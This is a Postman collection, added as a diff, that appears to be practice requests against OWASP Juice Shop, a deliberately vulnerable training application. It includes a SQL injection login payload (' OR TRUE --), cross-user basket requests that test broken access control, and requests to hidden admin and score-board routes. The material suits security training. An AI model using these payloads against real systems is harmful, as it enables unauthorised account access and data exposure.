@@ -1,0 +1,310 @@
+{
+	"info": {
+		"_postman_id": "692a9318-2730-4f4f-a507-0a183dd3a9e6",
+		"name": "juice-shop",
+		"description": "- Login as admin\n    \n- Navigator main.js\n    \n    - {path: \"score-board\", component: Wt}\n        \n    - {path: \"administration\", component: U,canActivate:\\[Hi\\]}",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json",
+		"_exporter_id": "1453931",
+		"_collection_link": "https://red-firefly-245852.postman.co/workspace/7e6a987b-cef3-4218-bda3-e54197ccd2df/collection/1453931-692a9318-2730-4f4f-a507-0a183dd3a9e6?action=share&source=collection_link&creator=1453931"
+	},
+	"item": [
+		{
+			"name": "access-control",
+			"item": [
+				{
+					"name": "Creare user01",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user01\",\n    \"password\": \"user01\",\n    \"passwordRepeat\": \"user01\",\n    \"securityQuestion\": {\n        \"id\": 3,\n        \"question\": \"Mother's birth date? (MM/DD/YY)\"\n    },\n    \"securityAnswer\": \"user01@gmail.com\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/api/Users/"
+					},
+					"response": []
+				},
+				{
+					"name": "Creare user02",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user02\",\n    \"password\": \"user02\",\n    \"passwordRepeat\": \"user02\",\n    \"securityQuestion\": {\n        \"id\": 3,\n        \"question\": \"Mother's birth date? (MM/DD/YY)\"\n    },\n    \"securityAnswer\": \"user02@gmail.com\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/api/Users/"
+					},
+					"response": []
+				},
+				{
+					"name": "Login user01",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = pm.response.json();",
+									"pm.collectionVariables.set(\"token_user01\", jsonData.authentication.token);",
+									"pm.collectionVariables.set(\"user_id_01\", jsonData.authentication.bid);"
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user01\",\n    \"password\": \"user01\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/rest/user/login"
+					},
+					"response": []
+				},
+				{
+					"name": "Login user02",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = pm.response.json();",
+									"pm.collectionVariables.set(\"token_user02\", jsonData.authentication.token);",
+									"pm.collectionVariables.set(\"user_id_02\", jsonData.authentication.bid);"
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user02\",\n    \"password\": \"user02\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/rest/user/login"
+					},
+					"response": []
+				},
+				{
+					"name": "User01 view basket",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": {
+								"token": "{{token_user01}}"
+							}
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user02\",\n    \"password\": \"user02\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/rest/basket/{{user_id_01}}"
+					},
+					"response": []
+				},
+				{
+					"name": "User01 view basket user02",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": {
+								"token": "{{token_user01}}"
+							}
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user02\",\n    \"password\": \"user02\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/rest/basket/{{user_id_02}}"
+					},
+					"response": []
+				},
+				{
+					"name": "User02 view basket user01",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": {
+								"token": "{{token_user02}}"
+							}
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"user02\",\n    \"password\": \"user02\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://143.198.90.190:3000/rest/basket/{{user_id_01}}"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Login with sql injection",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"email\": \"' OR TRUE --\",\n    \"password\": \"xyz\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": "http://143.198.90.190:3000/rest/user/login"
+			},
+			"response": []
+		},
+		{
+			"name": "score-board",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": "http://143.198.90.190:3000/#/score-board"
+			},
+			"response": []
+		},
+		{
+			"name": "score-board Copy",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": "http://143.198.90.190:3000/#/administration"
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "token_user01",
+			"value": ""
+		},
+		{
+			"key": "token_user02",
+			"value": ""
+		},
+		{
+			"key": "user_id_02",
+			"value": ""
+		},
+		{
+			"key": "user_id_01",
+			"value": ""
+		}
+	]
+}
